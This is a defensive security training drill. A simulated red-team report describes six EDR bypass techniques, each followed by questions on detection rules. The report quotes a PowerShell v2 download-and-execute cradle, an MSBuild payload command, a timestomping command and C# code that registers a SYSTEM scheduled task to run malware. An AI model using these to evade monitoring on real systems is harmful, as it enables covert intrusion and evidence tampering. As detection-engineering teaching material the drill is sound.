# Drill 02 (Advanced): EDR Bypass Detection Techniques

**Level:** Advanced

**Estimated time:** 60 minutes

**Skills tested:** EDR bypass awareness, advanced detection engineering, behavioral hunting, defensive architecture

---

## Overview

This drill examines **known EDR bypass and evasion techniques** from a **defender's perspective**.
Understanding how attackers attempt to evade EDR is essential for:

1. Tuning your EDR rules to close gaps
1. Understanding which alerts to prioritize (often bypasses indicate a more sophisticated attacker)
1. Red team assessments to test your detection coverage

> **Important:** This material is presented purely from a defensive/detection standpoint. Understanding these techniques is necessary to build detection coverage.

---

## Scenario

Your organization uses a commercial EDR platform.
Your red team (authorized internal penetration testers) has submitted a report claiming they were able to operate on three endpoints for over 4 hours without triggering any EDR alerts, despite performing significant post-exploitation activity.
They provide the following technical report with details of the techniques used.

Your task: **Review each technique, explain the detection gap, and write detection logic to catch the technique.**

---

## Red Team Report: Bypass Techniques Used

---

### Technique 1: PowerShell Downgrade Attack

**Red Team Notes:**

```text
On HOST: HR-PC07
User context: domain\jsmith

We downgraded PowerShell to version 2 before executing our payload:
  powershell.exe -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('...')"

PowerShell v2 does NOT support:
  - Script Block Logging (Event 4104)
  - Module Logging (Event 4103)
  - AMSI (Antimalware Scan Interface)

Our payload ran successfully with no Script Block Log events generated.
EDR behavioral rule for encoded commands did not fire because we used
-command (not -enc) with a clear-text download cradle.
```

---

### Technique 2: Process Hollowing via Direct Syscalls

**Red Team Notes:**

```text
On HOST: DEV-PC12
User context: domain\dev_svc

We used direct syscalls to evade user-mode API hooking:

EDRs typically hook these Windows API functions to monitor behavior:
  NtCreateProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory,
  NtProtectVirtualMemory, NtCreateThreadEx

Our tool bypasses hooks by calling the NT kernel directly via syscall
instruction instead of going through ntdll.dll (where hooks are placed).

Result: svchost.exe was hollowed out and running our shellcode.
EDR Event 25 (ProcessTampering) was not generated because the hooking
mechanism was bypassed. Sysmon only saw normal svchost.exe behavior.
```

---

### Technique 3: Living Off the Land — MSBuild.exe

**Red Team Notes:**

```text
On HOST: BUILD-SRV01
User context: domain\build_svc (build server service account)

We abused MSBuild.exe (Microsoft Build Engine) to execute our payload:
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.csproj

The malicious.csproj file is a legitimate MSBuild project file format
that contains embedded C# code which executes our shellcode loader
inline during the "build" process.

Why this bypassed EDR:
  - MSBuild.exe is a signed Microsoft binary
  - Build servers legitimately run MSBuild all day
  - Our .csproj file had no detectable malicious strings (code was in
    a base64-encoded "resource" embedded in the XML)
  - No suspicious parent-child relationship (build_svc runs MSBuild)
  - EDR had MSBuild on the exclusion list (too noisy on build servers)
```

---

### Technique 4: Token Impersonation — Incognito

**Red Team Notes:**

```text
On HOST: FILE-SRV02
User context: Started as NETWORK SERVICE, elevated to admin

We used token impersonation to steal a logged-in domain admin's token:

1. Compromised service running as NETWORK SERVICE

2. Listed available tokens in memory (using impersonation privileges)
3. Found token for domain\domainadmin (who was running a backup job)
4. Impersonated that token without any authentication
5. All subsequent commands ran as domain\domainadmin

Why it bypassed EDR:
  - No credential dump (no LSASS access — Event 10 never fired)
  - Authentication events showed domain\domainadmin but EDR attributed
    to our known-compromised process
  - No 4624 event generated (impersonation, not new logon)
  - Commands appeared to come from domainadmin in logs
```

---

### Technique 5: Timestomping — Evidence Tampering

**Red Team Notes:**

```text
On HOST: EXEC-PC03

After deploying our tools, we modified file timestamps to match
legitimate system files (to avoid "recently created files" hunting):

Technique:
  Set-ItemProperty -Path malicious.dll -Name LastWriteTime -Value "01/01/2021 10:00:00"

Also used: Windows API PowerShell module to modify:
  - LastAccessTime
  - LastWriteTime
  - CreationTime

All set to 2021-01-01 to match legitimate DLLs in the same directory.

Why it bypassed hunting:
  - Timeline analysis of "recently modified files" skipped our files
  - DFIR analysts hunting for files created/modified post-compromise
    would miss our implant in the initial sweep
```

---

### Technique 6: Scheduled Task via COM Object (No schtasks.exe)

**Red Team Notes:**

```text
On HOST: ADMIN-WS01

Standard scheduled task creation (schtasks.exe, PowerShell New-ScheduledTask)
triggers multiple detection signatures.

We used the COM interface directly:
```

```csharp
// C# code used
using System;
using TaskScheduler;

var service = new TaskSchedulerClass();
service.Connect();
var folder = service.GetFolder("\\");
var taskDef = service.NewTask(0);
taskDef.Actions.Create(TASK_ACTION_TYPE.TASK_ACTION_EXEC);
var exec = (IExecAction)taskDef.Actions[0];
exec.Path = @"C:\Windows\Temp\malware.exe";
folder.RegisterTaskDefinition("WindowsAIUpdate", taskDef, 6, "SYSTEM", null,
    TASK_LOGON_TYPE.TASK_LOGON_SERVICE_ACCOUNT);
```

```text
Why it bypassed:
  - No schtasks.exe or PowerShell process created
  - No parent process to flag as suspicious
  - Only a COM object interaction visible in low-level monitoring
  - EDR alert rule triggered on schtasks.exe execution — not on COM API calls
```

---

## Questions

---

### Q1 — PowerShell Downgrade Detection (4 points)

a) Explain exactly why PowerShell version 2 is a security problem.
What versions of Windows still have it installed by default?
b) Write a detection rule to catch PowerShell version downgrade attempts.
Include TWO different detection approaches.
c) Write a remediation recommendation to prevent this bypass.
d) If PowerShell v2 is blocked, what alternative technique might an attacker use?

---

### Q2 — Direct Syscall / Process Hollowing Detection (4 points)

a) Explain at a technical level why direct syscalls bypass EDR user-mode hooks.
b) Since API hook evasion defeats the traditional EDR detection path, what ALTERNATIVE detection mechanism could catch process hollowing?
Name at least two.
c) Sysmon Event 25 (ProcessTampering) is supposed to detect hollowing.
Why did it not fire in this case, and what does it actually detect?
d) Write a detection hypothesis that could catch hollowed processes through behavioral anomalies (not API hook).

---

### Q3 — MSBuild LOLBin Detection (3 points)

a) What is the broader LOLBin problem that MSBuild represents?
Name three other LOLBins that can execute arbitrary code from a file.
b) Why is "EDR excluded MSBuild due to noise" a dangerous configuration decision?
What's the proper approach to noisy legitimate tools?
c) Write a detection rule that catches malicious MSBuild usage even on a build server.

---

### Q4 — Token Impersonation Detection (4 points)

a) Explain the Windows token impersonation mechanism.
Why does it not generate authentication events?
b) What Sysmon/EDR event WOULD be generated during token impersonation?
What field would be anomalous?
c) Write a behavioral detection rule for token impersonation abuse.
d) What privilege is required to impersonate tokens of higher-privileged users, and how would an attacker typically obtain it?

---

### Q5 — Timestomping Detection (3 points)

a) Why does Sysmon Event 2 (FileCreationTimeChanged) exist, and what specifically does it detect?
b) Timestomping defeats forensic timeline analysis.
What OTHER forensic artifact can reveal the true creation time even after timestomping?
c) Write a detection rule for timestomping.

---

### Q6 — COM-Based Scheduled Task Detection (3 points)

a) What kernel-level or ETW (Event Tracing for Windows) data source would capture COM object calls that bypass schtasks.exe?
b) What artifact in the Windows file system confirms a scheduled task was created, regardless of how it was created?
c) Rewrite your detection approach for scheduled task creation that does not depend on detecting schtasks.exe.

---

### Q7 — Architecture Recommendation (5 points)

Based on the six bypass techniques described:

a) Write a **Detection Coverage Matrix** with one row per technique showing: Technique | Current Gap | Recommended Detection | Data Source Required | Priority.
b) Write an executive summary (4–5 sentences) explaining to a non-technical CISO why "we have an EDR" is not the same as "we are protected," using specific examples from this drill.

---

## Scoring: 26 points total

**See `solutions/drill-02-solution/README.md` for the complete answer key.**
